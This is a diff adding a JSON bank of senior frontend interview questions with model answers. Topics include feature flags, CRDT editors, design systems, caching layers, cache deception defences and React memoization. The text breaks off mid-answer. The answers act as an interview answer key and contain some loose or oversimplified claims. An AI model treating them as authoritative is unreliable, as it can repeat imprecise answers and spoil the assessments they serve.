@@ -1,0 +1,1323 @@
+{
+  "questions": [
+    {
+      "id": "feature-flags-001",
+      "category": "feature-flags",
+      "difficulty": "senior",
+      "question": "Design a scalable feature flag system for a large-scale frontend application. How would you handle complex targeting, rollout dependencies, and performance?",
+      "answer": "## High-Level Architecture\n\n\nA senior-level implementation requires a decoupled evaluation engine that supports consistent hashing for rollouts and prerequisite checks.\n\n### 1. Data Model\nWe need a flexible schema that supports simple toggles, multivariate values, and dependency chains.\n\n```typescript\ninterface FeatureFlag {\n  key: string;\n  type: 'boolean' | 'string' | 'number';\n  defaultValue: unknown;\n  rules: TargetingRule[];\n  rollout?: { percentage: number; seed?: string };\n  // Flag Dependencies: Flag B cannot be ON unless Flag A is ON\n  prerequisites?: { flagKey: string; requiredValue: unknown }[];\n}\n\ninterface TargetingRule {\n  conditions: Array<{\n    attribute: string; // e.g., 'email', 'version', 'region'\n    operator: 'in' | 'not_in' | 'regex' | 'gt' | 'lt';\n    value: unknown;\n  }>;\n  value: unknown;\n}\n```\n\n### 2. Evaluation Engine with Consistent Bucketing\n\nTo ensure a user doesn't \"flip-flop\" between states during a percentage rollout, we use a hash-based bucketing system rather than `Math.random()`.\n\n```typescript\nclass FlagEvaluator {\n  evaluate<T>(flag: FeatureFlag, context: UserContext): T {\n    // 1. Recursive Prerequisite Check\n    for (const prereq of flag.prerequisites ?? []) {\n      const parentValue = this.evaluate(this.getFlag(prereq.flagKey), context);\n      if (parentValue !== prereq.requiredValue) return flag.defaultValue as T;\n    }\n    \n    // 2. Targeting Rules (Override rollout)\n    for (const rule of flag.rules) {\n      if (this.matchesRule(rule, context)) return rule.value as T;\n    }\n    \n    // 3. Deterministic Percentage Rollout\n    if (flag.rollout) {\n      const isIncluded = this.computeHash(\n        context.userId, \n        flag.rollout.seed || flag.key, \n        flag.rollout.percentage\n      );\n      if (isIncluded) return true as T;\n    }\n    \n    return flag.defaultValue as T;\n  }\n  \n  private computeHash(userId: string, salt: string, percentage: number): boolean {\n    // Using a simple hash (e.g., FNV-1a or MurmurHash logic) \n    // to map the UserID + Salt to a value between 0-99\n    const hash = [...(`${userId}:${salt}`)].reduce((acc, char) => \n      ((acc << 5) - acc) + char.charCodeAt(0), 0\n    );\n    return Math.abs(hash % 100) < percentage;\n  }\n}\n```\n\n### 3. Performance Optimization\n\n* **Local Evaluation:** Fetch all flag configurations (rulesets) on app initialization and evaluate locally in-memory. This avoids network latency on every `getFlag` call.\n* **Bootstrap State:** Inject initial flag values into the HTML payload (SSR) to prevent \"layout shift\" or \"flicker\" during the first render.\n* **Streaming Updates:** Use Server-Sent Events (SSE) to push flag updates in real-time without polling.",
+      "keyPoints": [
+        "Consistent hashing for deterministic user experience",
+        "Recursive prerequisite/dependency handling",
+        "Strategies to prevent UI flickering (Bootstrapping)",
+        "Targeting based on complex user metadata"
+      ],
+      "followUpQuestions": [
+        "How do you handle feature flags in a Server-Side Rendering (SSR) context?",
+        "How would you integrate this with Segment or Mixpanel for A/B test analysis?"
+      ],
+      "relatedTopics": [
+        "system-design",
+        "distributed-systems",
+        "ab-testing"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Netflix",
+        "Uber",
+        "Airbnb"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "feature-flags-002",
+      "category": "feature-flags",
+      "difficulty": "senior",
+      "question": "Explain how feature flags facilitate Trunk-Based Development and outline a comprehensive strategy for managing the resulting technical debt.",
+      "answer": "## Trunk-Based Development (TBD)\n\n\nIn TBD, developers merge small, frequent updates to a single branch (`main`). Feature flags act as the \"decoupling agent\" between **Deployment** (moving code to prod) and **Release** (turning it on for users).\n\n```typescript\n// The 'Branch by Abstraction' pattern\nfunction PaymentService() {\n  const isStripeEnabled = useFeatureFlag('enable-stripe-v2');\n  \n  // Both implementations coexist in the codebase safely\n  return isStripeEnabled ? <StripeProviderV2 /> : <LegacyPayPalProvider />;\n}\n```\n\n## Testing Strategies for Binary Paths\n\nA common pitfall is only testing the \"ON\" state. Senior engineers ensure coverage for both.\n\n```typescript\ndescribe('Checkout Flow', () => {\n  const testCases = [\n    { flag: true, expected: 'new-ui' },\n    { flag: false, expected: 'legacy-ui' }\n  ];\n\n  test.each(testCases)('renders correctly when flag is $flag', ({ flag, expected }) => {\n    mockFeatureFlags({ 'new-checkout': flag });\n    render(<Checkout />);\n    expect(screen.getByTestId(expected)).toBeInTheDocument();\n  });\n});\n```\n\n## Managing Long-Lived Flags & Technical Debt\n\nTo prevent \"Flag Rot,\" we implement a multi-layered cleanup strategy:\n\n### 1. Categorization\n* **Release Flags:** Temporary (TTL < 4 weeks).\n* **Ops Flags:** Permanent \"Kill Switches\" for circuit breaking.\n* **Permission Flags:** Long-lived for tier-based access (e.g., 'premium-user').\n\n### 2. Automated Governance\n```typescript\n// CI Script to find stale flags\nconst STALE_THRESHOLD_DAYS = 60;\n\nasync function checkStaleFlags() {\n  const flags = await flagClient.getMetadata();\n  const stale = flags.filter(f => \n    f.type === 'release' && \n    diffDays(f.createdAt, Date.now()) > STALE_THRESHOLD_DAYS\n  );\n  \n  if (stale.length) {\n    notifySlack(`Found ${stale.length} stale flags requiring cleanup: ${stale.map(s => s.key)}`);\n  }\n}\n```\n\n### 3. Code Quality Rules\n* **No Nested Flags:** Avoid `if (flagA) { if (flagB) { ... } }`.\n* **Max Flag Limit:** Enforce a linting rule or soft-cap on the number of active release flags per module to prevent combinatorial explosion.",
+      "keyPoints": [
+        "Decouples deployment from release",
+        "Implements 'Branch by Abstraction'",
+        "Mandates 'Both-Path' testing (ON and OFF)",
+        "Automated stale flag detection and TTL enforcement"
+      ],
+      "followUpQuestions": [
+        "How do you handle database migrations when the code is behind a feature flag?",
+        "What are the risks of 'Flag Hell' (combinatorial explosion of states)?"
+      ],
+      "relatedTopics": [
+        "ci-cd",
+        "devops",
+        "testing-strategy",
+        "technical-debt"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Google",
+        "Meta",
+        "Stripe"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-001",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Architect a Local-First Collaborative Editor (e.g., Notion/Google Docs). Focus on data consistency (CRDTs), offline persistence, and performance for large documents.",
+      "answer": "## Architectural Strategy: The \"Hybrid Consistency\" Model\n\nA senior implementation moves beyond basic WebSocket connections to a **Local-First** architecture. We treat the browser's IndexedDB as the source of truth, syncing to the server in the background.\n\n### 1. Data Structure & Consistency\n**Decision:** Use CRDTs (Yjs/Automerge) for text, but Atomic Locking for structural blocks.\n* **Text (CRDT):** Commutative operations allow lock-free concurrent editing.\n* **Block Structure (Last-Write-Wins):** Moving a paragraph is a structural change. Using CRDTs here can result in \"ghost\" paragraphs. A \"Block Locking\" or LWW approach is often more predictable for layout.\n\n### 2. The \"Sync Engine\" Layer\nDecouple networking from the view. The UI subscribes to a local store, not the socket.\n\n```typescript\n// Architecture Concept: The Sync Worker\n// Moving sync logic to a SharedWorker prevents tab-freezing during large merges.\n\nclass DocumentSyncWorker {\n  private db: IndexedDB;\n  private ws: WebSocket;\n  private doc: Y.Doc;\n\n  constructor() {\n    this.setupPersistence(); // Load from IDB first (Instant load)\n    this.setupNetwork();     // Connect to signaling server\n  }\n\n  // Delta updates only to save bandwidth\n  sync(update: Uint8Array) {\n    this.ws.send(update);\n    this.db.store(update); \n  }\n}\n```\n\n### 3. Performance & Virtualization\n**Problem:** Rendering 500 pages of DOM nodes kills performance.\n**Solution:**\n* **Windowing:** Only render the viewport + buffer.\n* **Layered Rendering:** * *Layer 1 (Canvas):* Minimap/Scrollbar highlights (high frequency).\n    * *Layer 2 (DOM):* Editable text nodes.\n* **Heuristic:** If a user types fast, pause \"heavy\" reconciliations (e.g., table of contents updates) until the user goes idle (debounce).\n\n### 4. Trade-offs\n* **Memory:** CRDTs grow indefinitely (tombstones). **Mitigation:** Implement \"Squashing\" protocols on the server to prune history periodically.\n* **Initial Load:** Large docs take time to parse. **Mitigation:** Server-side rendering (SSR) of the initial static HTML snapshot while the CRDT hydrates in the background.",
+      "keyPoints": [
+        "Local-First Architecture (Offline reliability)",
+        "CRDTs (Yjs) vs. Operational Transformation (OT)",
+        "SharedWorker for off-main-thread processing",
+        "Virtualization strategies for DOM limits",
+        "History pruning (Garbage collection for CRDTs)"
+      ],
+      "followUpQuestions": [
+        "How do you handle 'cursor' broadcasting without polluting the document history?",
+        "Design the backend storage for a CRDT-based system (Database vs. Blob storage).",
+        "How would you implement 'Undo/Redo' ensuring it only affects the local user's actions?"
+      ],
+      "relatedTopics": [
+        "crdt",
+        "web-workers",
+        "performance",
+        "indexeddb"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Notion",
+        "Figma",
+        "Atlassian"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-002",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a scalable Component Library (Design System) for a multi-team organization. Address 'Headless' architecture, Design Tokens, and preventing bundle bloat.",
+      "answer": "## Architectural Strategy: The \"Headless + Skin\" Pattern\n\nThe goal is to separate **Behavior** (Accessibility/Logic) from **Appearance** (Styling). This prevents \"Prop Drilling Hell\" and ensures accessibility consistency.\n\n### 1. The Headless Foundation\nDon't write your own Combobox logic. Wrap \"Headless\" primitives (e.g., Radix UI, React Aria).\n* **Why:** They handle the complex WAI-ARIA specs, keyboard navigation, and focus management.\n* **Our Layer:** We apply the *Corporate Brand* on top.\n\n### 2. API Design: Composition over Configuration\nAvoid the \"God Component\" (e.g., `<Button variant=\"primary\" size=\"lg\" iconLeft=\"...\" />`).\nUse the **Compound Component** pattern to allow flexibility without API bloat.\n\n```tsx\n// ❌ Anti-Pattern: One component, 50 props\n<Modal title=\"Hi\" onClose={...} footerButtons={[...]} />\n\n// ✅ Senior Pattern: Composition\n<Modal.Root open={isOpen}>\n  <Modal.Overlay />\n  <Modal.Content>\n    <Modal.Title>Hi</Modal.Title>\n    <Modal.Description>...</Modal.Description>\n    <Modal.Footer>\n       {/* Consumer controls the layout completely */}\n       <Button>Save</Button> \n    </Modal.Footer>\n  </Modal.Content>\n</Modal.Root>\n```\n\n### 3. Design Tokens (The Contract)\nDo not use raw hex codes or pixels in components. Use semantic tokens.\n* **Primitive:** `blue-500: #3b82f6`\n* **Semantic:** `btn-primary-bg: var(--blue-500)`\n* **Architecture:** Export tokens as JSON. Use a build script (Style Dictionary) to generate CSS variables for Web, XML for Android, and Swift classes for iOS.\n\n### 4. Delivery & Tree Shaking\n* **Barrel Files:** Dangerous. If `import { Button } from '@ui/kit'` imports the DatePicker, you failed.\n* **Solution:** ensure `package.json` has `\"sideEffects\": false`.\n* **CSS Extraction:** Decide between Runtime (Emotion/Styled-components) vs. Zero-Runtime (Vanilla Extract/Tailwind). **Recommendation:** Zero-runtime for better performance and smaller bundles.",
+      "keyPoints": [
+        "Headless UI (Radix/React Aria) integration",
+        "Compound Component Pattern vs. Monolithic Props",
+        "Semantic Design Tokens vs. Hardcoded values",
+        "Tree-shaking and 'sideEffects' configuration",
+        "Polymorphism (asChild / 'as' prop) handling"
+      ],
+      "followUpQuestions": [
+        "How do you handle versioning? (Monorepo vs. Versioned Packages)",
+        "Explain how you would implement a 'Theming Engine' that supports multiple brands.",
+        "How do you enforce accessibility (a11y) in the CI/CD pipeline?"
+      ],
+      "relatedTopics": [
+        "design-systems",
+        "a11y",
+        "monorepo",
+        "css-architecture"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Airbnb",
+        "Shopify",
+        "Vercel"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-003",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Architect a High-Frequency Trading Dashboard. It must handle 100+ updates/sec across 50 widgets without freezing the main thread.",
+      "answer": "## Architectural Strategy: The \"Off-Main-Thread\" Pipeline\n\nReact is fast, but it cannot handle 100+ state updates per second without blocking user interaction. The strategy relies on **Bypassing the Reconciliation Loop**.\n\n### 1. The Data Ingestion Layer (SharedWorker)\nUse a `SharedWorker` to ingest WebSocket data.\n* **Why?** It survives page reloads and can share data between multiple tabs (preventing multiple socket connections per user).\n* **Throttling:** The worker buffers updates and emits a \"batch\" every 50ms (20fps) or 16ms (60fps), decoupling network speed from render speed.\n\n### 2. State Management: Mutable Refs vs. Immutable State\nFor high-frequency data, standard `useState` causes too many re-renders.\n* **Technique:** Store live data in `useRef` or a mutable store (like Zustand/MobX).\n* **Transient Updates:** Components subscribe only to *their* specific slice of data.\n\n### 3. Rendering Strategy: Canvas vs. DOM\n* **Data Grids:** Use DOM with strict virtualization (TanStack Virtual). CSS `contain: strict` to isolate layout recalculations.\n* **Charts:** DOM SVG is too heavy for real-time. Use **Canvas (WebGL)**.\n    * *Why:* You modify pixels, not the DOM tree. Zero layout thrashing.\n\n```typescript\n// Concept: Transient Update Hook (Bypassing React Render Cycle)\nconst useLivePrice = (symbol: string, ref: RefObject<HTMLDivElement>) => {\n  useEffect(() => {\n    const unsub = socket.subscribe(symbol, (price) => {\n      // ⚡️ DIRECT DOM MANIPULATION\n      // We skip React's diffing algorithm entirely for this hot path\n      if (ref.current) {\n        ref.current.textContent = formatCurrency(price);\n        ref.current.style.color = price > prev ? 'green' : 'red';\n      }\n    });\n    return unsub;\n  }, [symbol]);\n};\n```\n\n### 4. Isolation (Micro-Frontends / Widgets)\nWrap widgets in **Error Boundaries**. If the \"Crypto Ticker\" crashes due to a bad data packet, it shouldn't crash the \"User Portfolio\" or the Navigation bar.",
+      "keyPoints": [
+        "SharedWorkers for connection pooling",
+        "Transient Updates (Direct DOM/Canvas manipulation)",
+        "Throttling vs. Debouncing network traffic",
+        "CSS Containment & Layout Thrashing",
+        "BFF (Backend for Frontend) aggregation"
+      ],
+      "followUpQuestions": [
+        "How do you handle memory leaks in a Single Page App running for 8+ hours?",
+        "Design a priority queue for the updates (e.g., User Portfolio > Market News).",
+        "How would you debug a 'jank' issue where the browser drops frames every 3 seconds?"
+      ],
+      "relatedTopics": [
+        "performance",
+        "websockets",
+        "canvas",
+        "react-internals"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Coinbase",
+        "Bloomberg",
+        "Robinhood"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "system-design-004",
+      "category": "system-design",
+      "difficulty": "senior",
+      "question": "Design a Server-Driven Form Builder with complex inter-field dependencies (e.g., Field B shows if Field A > 10).",
+      "answer": "## Architectural Strategy: The \"Dependency Graph\" Engine\n\nA simple list of fields fails when logic becomes complex (\"Show X if Y is true\"). We must treat the form as a **Directed Acyclic Graph (DAG)**.\n\n### 1. The Schema (Protocol)\nThe server sends a schema that defines *data* and *logic*, not just UI.\n\n```json\n{\n  \"fields\": [\n    { \"id\": \"age\", \"type\": \"number\" },\n    { \"id\": \"parent_signature\", \"type\": \"signature\", \"hidden\": true }\n  ],\n  \"rules\": [\n    // The \"Edge\" in our graph\n    { \"target\": \"parent_signature\", \"effect\": \"show\", \"condition\": { \"field\": \"age\", \"op\": \"lt\", \"value\": 18 } }\n  ]\n}\n```\n\n### 2. The Evaluation Engine (Topological Sort)\nWe cannot just render fields linearly. We need a reactive engine.\n* **Push Model:** When \"Age\" changes, look up its *dependents* in the graph and re-evaluate them.\n* **Pull Model:** A field computes its own state by subscribing to its *dependencies*.\n* **Senior Choice:** Use a reactive library (Hookstate / Signals) or a state machine (XState) to manage this graph efficiently. Rerendering the whole form on every keystroke is unacceptable (O(n)).\n\n### 3. Component Registry\nMap the schema `type` string to a React component.\n* **Lazy Loading:** Use `React.lazy` for heavy fields (e.g., Rich Text Editor, Map Picker). Don't load the code unless the logic graph says the field is visible.\n\n### 4. Performance: Subscription Architecture\nInstead of one giant `<FormContext>` that renders everything:\n```tsx\n// Each field subscribes ONLY to the data it needs\nconst Field = ({ id }) => {\n  // Only re-renders if logic dictates visibility change\n  const isVisible = useStore(state => state.visibility[id]); \n  if (!isVisible) return null;\n  return <Input id={id} />;\n}\n```\n",
+      "keyPoints": [
+        "Server-Driven UI (SDUI) protocols",
+        "DAG (Directed Acyclic Graph) for dependency resolution",
+        "Topological Sorting",
+        "Subscription-based performance (Signals/Fine-grained)",
+        "Lazy loading heavy form controls"
+      ],
+      "followUpQuestions": [
+        "How do you handle circular dependencies (Field A depends on B, B depends on A)?",
+        "How do you validate this form on the backend to ensure the frontend didn't bypass rules?",
+        "Design a versioning system for the form schema so users on old cached JS don't break."
+      ],
+      "relatedTopics": [
+        "state-machines",
+        "graph-theory",
+        "server-driven-ui",
+        "optimization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Typeform",
+        "Shopify",
+        "Enterprise ERPs"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-001",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "Design a multi-tier caching strategy for a high-traffic global application. How do you mitigate 'Cache Deception' attacks, and what are the architectural trade-offs of 'stale-while-revalidate' at the Edge vs. the Browser?",
+      "answer": "## 1. Multi-Tier Architecture\n\nA robust caching strategy treats the network as a distributed state machine.\n\n```mermaid\nRequest Flow:\nClient \n  │ (1. Browser Cache: Memory/Disk)\n  ▼\nService Worker (2. Programmatic Cache)\n  │\n  ▼\nEdge Node (3. CDN Cache + Edge Workers)\n  │ \n  ▼\nOrigin Shield (4. Shared Regional Cache)\n  │\n  ▼\nOrigin Server (5. Application Memory/Redis)\n```\n\n### Architectural Distinctions\n\n| Layer | Responsibility | Invalidation Strategy | Risk |\n|-------|----------------|-----------------------|------|\n| **Browser** | Instant navigation, offline support | Versioned filenames, `Clear-Site-Data` | Stale code causing runtime errors |\n| **CDN/Edge** | Static assets, computed HTML regions | Surrogate keys, Purge API | Serving private data to wrong user |\n| **Origin** | Database query result caching | TTL, Write-through | Memory leaks, cache stampedes |\n\n### 2. The 'stale-while-revalidate' (SWR) Dichotomy\n\n**A. At the Browser (RFC 5861)**\n- **Mechanism:** Browser serves stale content from disk immediately, then initiates a background network fetch.\n- **Use Case:** Non-critical UI (avatars, dashboards).\n- **Trade-off:** UI consistency. Users may see \"ghost\" data before it snaps to reality.\n\n**B. At the Edge (CDN)**\n- **Mechanism:** Edge serves stale content to the *client*, then asynchronously fetches from Origin.\n- **Use Case:** High-throughput APIs, protecting Origin from spikes.\n- **Trade-off:** Origin load predictability. If 1M users hit a stale edge node, they all get the stale version, but the Origin only sees 1 revalidation request (Request Collapsing).\n\n```http\n# Hybrid Strategy Header\nCache-Control: public, max-age=60, stale-while-revalidate=3600, stale-if-error=86400\n```\n*Explanation:* Fresh for 60s. Between 60s-1h, serve stale but update background. If Origin is down, serve stale for 24h.\n\n### 3. Mitigating Cache Deception Attacks\n\n**The Vulnerability:** An attacker tricks a logged-in user into visiting `https://api.app.com/private-data/user.css`. The server ignores the extension and returns JSON. The CDN sees `.css`, assumes it's static, and caches the private JSON for *everyone*.\n\n**Defense Strategy:**\n\n1.  **Vary Header Enforcement:**\n    ```http\n    Vary: Cookie, Authorization\n    ```\n    *Forces CDN to partition cache based on auth tokens (effectively disabling shared caching for auth'd routes).*\n\n2.  **Explicit No-Cache on Dynamic Routes:**\n    Never rely on default CDN behavior.\n    ```http\n    Cache-Control: private, no-store\n    ```\n\n3.  **Extension Whitelisting:**\n    Configure CDN/WAF to only cache known extensions (.js, .css, .png) if the `Content-Type` matches strict MIME types.\n\n### 4. Advanced: The 'Vary' Trap\nUsing `Vary: User-Agent` is an architectural anti-pattern. It fragments the cache into thousands of buckets (one per browser version), reducing Cache Hit Ratio to near zero. Use `Vary` sparingly or normalize headers at the Edge (e.g., normalize `User-Agent` to just `Mobile` or `Desktop`).",
+      "keyPoints": [
+        "Distinguishes between Browser SWR (latency) and Edge SWR (origin protection)",
+        "Identifies Cache Deception mechanics (URL path vs Content-Type mismatch)",
+        "Understands Cache Stampede protection via Request Collapsing",
+        "Explain the danger of high-cardinality Vary headers"
+      ],
+      "followUpQuestions": [
+        "How does 'private' directive interact with shared proxies?",
+        "Explain the impact of ETags on server CPU vs. bandwidth.",
+        "How would you implement 'Soft Purge' vs 'Hard Purge'?"
+      ],
+      "relatedTopics": [
+        "cdn",
+        "security",
+        "http-spec",
+        "distributed-systems"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Cloudflare",
+        "Netflix",
+        "Akamai"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-002",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "Beyond basic syntax, analyze the 'Referential Stability Chain' in React. How does a single unstable reference at the root destroy performance in a large subtree, and how does the React Compiler (React Forget) change this mental model?",
+      "answer": "## 1. The Referential Stability Chain\n\nIn React, manual optimization (`memo`, `useMemo`) relies on an unbroken chain of stable references.\n\n**The Cascading Failure:**\nIf a Context Provider value is created without memoization, *every* consumer of that context re-renders. If those consumers pass derived values to children, the invalidation cascades down, bypassing `React.memo` boundaries because the props have technically changed.\n\n```typescript\n// ❌ The Root Cause (Unstable Context)\nconst App = () => {\n  // New object reference created on EVERY render\n  const config = { theme: 'dark', flags: { enableNewUI: true } }; \n  \n  return (\n    <ConfigContext.Provider value={config}>\n      <HugeComponentTree />\n    </ConfigContext.Provider>\n  );\n};\n\n// ❌ The Victim (Even if memoized)\nconst DeepChild = React.memo(({ data }) => {\n  // This re-renders because 'config' in the parent caused \n  // intermediate computations to produce new references.\n  return <div>...</div>;\n});\n```\n\n### 2. The Cost of Memoization\n\nUseMemo is not free. It incurs:\n1.  **Memory Overhead:** Retaining the previous result and dependencies.\n2.  **CPU Overhead:** Comparison logic runs on every render.\n\n**The Senior Heuristic:**\nDo NOT memoize primitive calculations (`a + b`). The overhead of `useMemo` (object allocation, array creation for deps, comparison) is often higher than the operation itself.\n*Only memoize when:*\n* The computation is O(n) where n > 1000.\n* **The reference is a dependency** for a `useEffect` or a `React.memo` component component.\n\n### 3. Architectural Pattern: Context Splitting\n\nTo preserve stability, split context by frequency of change.\n\n```typescript\n// ✅ Split frequent updates from static config\nconst App = () => {\n  const [user, setUser] = useState(null); // Frequent\n  const config = useMemo(() => ({ apiEndpoint: '...' }), []); // Static\n\n  return (\n    <ConfigContext.Provider value={config}>\n      <UserContext.Provider value={user}>\n        <Layout />\n      </UserContext.Provider>\n    </ConfigContext.Provider>\n  );\n};\n```\n\n### 4. The Future: React Compiler (React Forget)\n\nReact 19+ introduces an auto-memoizing compiler.\n\n* **Paradigm Shift:** We move from \"manual dependency tracking\" to \"fine-grained reactivity\".\n* **How it works:** The compiler analyzes data flow at build time and memoizes *everything* (components, hooks, values) automatically.\n* **Impact:** `useMemo` and `useCallback` become mostly obsolete for performance tuning, remaining useful only for semantic guarantees (e.g., ensuring a `useEffect` doesn't fire too often).\n\n**Mental Model Shift:**\n* *Before:* \"Is this expensive? Memoize it.\"\n* *After:* \"Is this a semantic requirement for an effect? Memoize it. Otherwise, trust the compiler.\"",
+      "keyPoints": [
+        "Concept of 'Referential Cascade' breaking React.memo",
+        "Context Splitting as a solution for high-frequency updates",
+        "Memory/CPU cost of memoization vs. raw recalculation",
+        "React Compiler shifting focus from performance to semantics"
+      ],
+      "followUpQuestions": [
+        "How do you debug 'Render Thrashing' using the React Profiler?",
+        "Why does passing a new function to a custom hook break its internal memoization?",
+        "What is the 'component composition' pattern as an alternative to memoization?"
+      ],
+      "relatedTopics": [
+        "react-internals",
+        "performance-profiling",
+        "compiler-theory"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Uber",
+        "Airbnb"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-003",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "Implement a memory-safe LRU cache for a long-running SPA. How do you prevent memory leaks when caching DOM nodes or large closures, and how does `WeakRef` play a role?",
+      "answer": "## 1. Memory Leaks in SPA Caching\n\nStandard `Map` or object-based caches hold **Strong References**. If you cache a large object (or worse, a detached DOM node), the Garbage Collector (GC) cannot free it even if the application no longer needs it. In a long-running dashboard, this leads to OOM (Out of Memory) crashes.\n\n### 2. The Solution: WeakRef & FinalizationRegistry\n\nWe need a cache that holds items *weakly*—allowing the GC to reap them if memory is tight or they are unused elsewhere—while still enforcing an LRU policy for \"strong\" usage.\n\n```typescript\n/**\n * Senior Pattern: LRU with Weak References\n * * Strategy: \n * 1. 'Hot' items are held strongly (Map).\n * 2. 'Cold' items are held weakly (WeakRef).\n * 3. If a Cold item is accessed, it becomes Hot.\n * 4. If memory pressure is high, GC reaps Cold items automatically.\n */\n\nclass HybridWeakLRUCache<K extends object, V extends object> {\n  private strongCache = new Map<K, V>();\n  private weakCache = new WeakMap<K, WeakRef<V>>();\n  private accessOrder: K[] = []; // Tracking for LRU\n  \n  constructor(private readonly maxStrongSize: number) {}\n\n  set(key: K, value: V) {\n    // 1. Add to strong cache (It's hot)\n    this.strongCache.set(key, value);\n    this.addToAccessOrder(key);\n    \n    // 2. Also register weak reference for fallback\n    this.weakCache.set(key, new WeakRef(value));\n\n    // 3. Evict if needed\n    if (this.strongCache.size > this.maxStrongSize) {\n      this.evictLeastRecent();\n    }\n  }\n\n  get(key: K): V | undefined {\n    // Case A: It's in strong cache (Hot)\n    if (this.strongCache.has(key)) {\n      this.refreshAccess(key);\n      return this.strongCache.get(key);\n    }\n\n    // Case B: It dropped to weak cache (Cold but not GC'd)\n    const weakRef = this.weakCache.get(key);\n    const value = weakRef?.deref();\n    \n    if (value) {\n      // Resurrect: Move back to strong cache\n      this.strongCache.set(key, value);\n      this.addToAccessOrder(key);\n      \n      // Check overflow again\n      if (this.strongCache.size > this.maxStrongSize) {\n        this.evictLeastRecent();\n      }\n      return value;\n    }\n\n    // Case C: GC'd or never existed\n    return undefined;\n  }\n\n  private evictLeastRecent() {\n    const oldestKey = this.accessOrder.shift();\n    if (oldestKey) {\n      // Remove from strong cache ONLY. \n      // It remains in weakCache until GC decides to kill it.\n      this.strongCache.delete(oldestKey);\n    }\n  }\n  \n  // ... helper methods for accessOrder array management ...\n}\n```\n\n### 3. Architectural Nuance: Cache Size vs. Heap Size\n\nA `maxSize=1000` doesn't mean safety. 1000 integers is tiny; 1000 4MB JSON blobs is 4GB.\n\n**Senior Implementation Detail:**\nUse `window.performance.memory` (Chrome only) or a byte-size estimation function to govern eviction based on **Heap Impact**, not just item count.\n\n```typescript\nfunction sizeOf(obj: any): number {\n  // Rough approximation for eviction policy\n  return JSON.stringify(obj).length * 2; \n}\n```\n",
+      "keyPoints": [
+        "Difference between Strong and Weak references in JS",
+        "Hybrid cache strategy (Strong Hot / Weak Cold)",
+        "Role of Garbage Collector in cache eviction",
+        "Byte-size estimation vs. count-based eviction"
+      ],
+      "followUpQuestions": [
+        "How does FinalizationRegistry help in cleaning up side effects of cached items?",
+        "Why are detached DOM nodes particularly dangerous in caches?",
+        "How would you synchronize this cache across multiple web workers?"
+      ],
+      "relatedTopics": [
+        "memory-management",
+        "garbage-collection",
+        "data-structures"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Google (Chrome Team)",
+        "Figma",
+        "VsCode"
+      ],
+      "createdAt": "2026-01-30T23:53:35.573Z",
+      "updatedAt": "2026-01-30T23:53:35.573Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-004",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "Architecturally, how does React Query (TanStack Query) differ from global state managers (Redux/Zustand)? Explain the 'Server State' vs 'Client State' synchronization problem and how to handle 'Optimistic UI' rollbacks safely.",
+      "answer": "## 1. Server State vs. Client State\n\n**The Fundamental Split:**\n* **Client State (Redux/Zustand):** Synchronous, owned by the browser (UI isOpen, form inputs, theme).\n* **Server State (React Query):** Asynchronous, owned by a remote server, potentially outdated, shared by multiple users.\n\nUsing Redux for Server State leads to \"Boilerplate Bloat\" (thunks, loading flags, error strings) and \"Truth Discrepancies\" (Redux store says User is X, DB says User is Y). React Query treats the cache as a *reflection* of the server, not the source of truth.\n\n## 2. Optimistic UI: The Architectural Hazard\n\nOptimistic updates (updating UI before server confirms) introduce race conditions.\n\n**Scenario:**\n1. User clicks \"Like\" (Optimistic update: +1).\n2. Request A (Like) is sent.\n3. User clicks \"Unlike\" immediately.\n4. Request B (Unlike) is sent.\n5. Request B fails. Request A succeeds.\n\n**The Solution: Snapshot & Rollback Context**\n\n```typescript\nconst useLikeMutation = () => {\n  const queryClient = useQueryClient();\n\n  return useMutation({\n    mutationFn: updateLikeOnServer,\n    \n    // 1. Prepare (Run before mutation)\n    onMutate: async (newLikeStatus) => {\n      // STOP outgoing refetches (prevent overwriting our optimistic update)\n      await queryClient.cancelQueries({ queryKey: ['likes'] });\n\n      // SNAPSHOT previous value\n      const previousLikes = queryClient.getQueryData(['likes']);\n\n      // UPDATE cache optimistically\n      queryClient.setQueryData(['likes'], (old) => ({\n        ...old,\n        liked: newLikeStatus\n      }));\n\n      // RETURN context for rollback\n      return { previousLikes };\n    },\n\n    // 2. Handle Failure\n    